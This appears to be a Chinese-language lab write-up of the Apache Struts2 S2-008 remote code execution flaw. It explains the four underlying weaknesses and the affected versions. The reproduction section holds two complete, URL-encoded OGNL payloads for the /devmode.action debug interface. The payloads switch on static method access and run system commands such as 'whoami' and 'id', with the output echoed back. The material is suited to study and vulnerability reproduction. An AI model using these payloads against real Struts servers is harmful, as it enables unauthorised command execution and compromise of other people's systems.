# Struts2_008_远程代码执行

###### by ADummy

### 0x00利用路线

​			burpuite抓包--->修改payload--->重放包--->代码执行

### 0x01漏洞介绍

​			为了防止攻击者在参数内调用任意方法，默认情况下将标志xwork.MethodAccessor.denyMethodExecution设置为true，并将SecurityMemberAccess字段allowStaticMethodAccess设置为false。另外，为了防止访问上下文变量，自Struts 2.2.1.1开始，在ParameterInterceptor中应用了针对参数名称的改进字符白名单：`acceptedParamNames = "[a-zA-Z0-9\.][()_']+";`

在某些情况下，可以绕过这些限制以执行恶意Java代码。

1，在Struts <= 2.2.3中执行远程命令（ExceptionDelegator）即**S2-007**
将参数值应用于属性时发生异常时，该值将作为OGNL表达式求值。例如，在将字符串值设置为整数属性时会发生这种情况。由于未过滤值，因此攻击者可以滥用OGNL语言的功能来执行任意Java代码，从而导致远程命令执行。已报告此问题（https://issues.apache.org/jira/browse/WW-3668），该问题已在Struts 2.2.3.1中修复。但是，执行任意Java代码的能力已被忽略。

2，在Struts <= 2.3.1（CookieInterceptor）中执行远程命令
参数名称的字符白名单不适用于CookieInterceptor。将Struts配置为处理cookie名称时，攻击者可以执行对Java函数具有静态方法访问权限的任意系统命令。因此，可以在请求中将标志allowStaticMethodAccess设置为true。虽然cookiename没有做特殊字符的限制，会被当作ognl代码执行。不过java的webserver(tomcat等)在cookiename中禁掉了很多非主流字符，该漏洞局限性较大，危害较小。

3，Struts <= 2.3.1中的任意文件覆盖（ParameterInterceptor）
由于Struts 2.2.3.1禁止在参数内访问标志allowStaticMethodAccess，因此攻击者仍然可以仅使用String类型的一个参数访问公共构造函数以创建新的Java对象，并仅使用String类型的一个参数访问其setter。例如，在创建和覆盖任意文件时可能会滥用此权限。要将禁止的字符注入文件名，可以使用未初始化的字符串属性。

4，在Struts <= 2.3.17中远程执行命令（DebuggingInterceptor）
尽管本身不是安全漏洞，但请注意，以开发人员模式运行并使用DebuggingInterceptor的应用程序也容易执行远程命令。尽管应用程序在生产过程中绝不应在开发人员模式下运行，但开发人员应意识到，这样做不仅会带来性能问题（如文档所述），而且还会对安全性造成严重影响。



ps：转载自（god zzz师傅）

​		**S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的。**

​			影响版本

  		2.1.0 - 2.3.1

### 0x02漏洞复现

#### 无回显payload：

/devmode.action？debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23a%3d@java.lang.Runtime@getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2c%23b%3dnew java.io.InputStreamReader%28%23a%29%2c%23c%3dnew java.io.BufferedReader%28%23b%29%2c%23d%3dnew char%5b50000%5d%2c%23c.read%28%23d%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%23d%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29

#### 有回显payload:

/devmode.action?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27**id**%27%29.getInputStream%28%29%29)

​			**登录界面**

![S2_008_rce_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_008_rce_1.jpg)

​			**Burpsuite抓包，发送第一个payload，有回显，id被执行。**

![S2_008_rce_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_008_rce_2.jpg)



### 0x03参考资料

https://www.cnblogs.com/Feng-L/p/13644818.html

https://blog.csdn.net/god_zzZ/article/details/94398559